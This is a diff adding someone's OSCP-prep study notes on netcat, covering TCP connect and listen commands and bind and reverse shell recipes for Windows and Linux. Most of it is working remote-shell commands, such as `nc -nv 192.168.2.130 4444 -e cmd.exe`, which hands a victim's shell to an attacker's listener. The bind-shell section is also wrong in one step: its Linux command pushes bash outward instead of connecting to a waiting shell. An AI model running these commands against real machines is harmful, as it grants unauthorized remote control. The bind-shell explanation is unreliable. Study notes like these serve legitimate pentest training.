@@ -1,0 +1,44 @@
+####NETCAT - ESTABLISH CONNECTIONS TO OPEN PORTS/CREATE LISTENING PORTS ON LOCAL MACHINE
+
+WHY? - Exploit development - Neccessary to determine HOW TO CONNECT TO A MACHINE ONCE AN EXPLOIT IS SENT AND WHAT TYPE OF SHELL IS GOING TO BE USED. PRIMARILY NETCAT FOR THIS COURSE TO CONNECT TO A MACHINE AND HAVE IT CONNECT TO US.
+
+Connecting vs LISTENING
+
+##To attempt to establish a connection with TCP port:
+
+    nc -nv [destination ip] [destination port]
+
+##To listen on TCP port:
+
+    nc -nvlp 4444
+
+###Bind Shell: Attacker connects to a victim on listening PORTS###
+
+    1. #On Windows Machine - set netcat to listen on 4444/tcp:
+    
+    C:\Users\rober\Dropbox\Dell\Work\Documents\education\Pentesting\OSCP Prep\netcat-1.11>nc64.exe
+    
+    #Once Netcat is running 'Cmd line:' prompt will appear; we will pass it the command line executable.
+        
+        Cmd line: -nvlp 4444 -e cmd.exe
+    
+    2.#On Linux Machine - set netcat to connect to 4444/tcp:
+    
+    nc -nv 192.168.2.1 4444 -e /bin/bash 
+
+###Reverse Shell: Victim connects to attacker on listening PORTS### (Mainly used)
+
+    1. #On Linux Machine - set netcat to listen on 4444/tcp:
+    
+    nc -nvlp 4444
+
+    2. #On Windows Machine - connect to 2.130 machine on 4444/tcp:
+    
+    C:\Users\rober\Dropbox\Dell\Work\Documents\education\Pentesting\OSCP Prep\netcat-1.11>nc64.exe
+        #Once Netcat is running 'Cmd line:' prompt will appear; we will 'pass the destination host'? the command line executable (-e)
+    
+        #Once Netcat is running 'Cmd line:' prompt will appear; we will pass it the command line executable.
+        
+        Cmd line: -nv 192.168.2.130 4444 -e cmd.exe
+    
+    
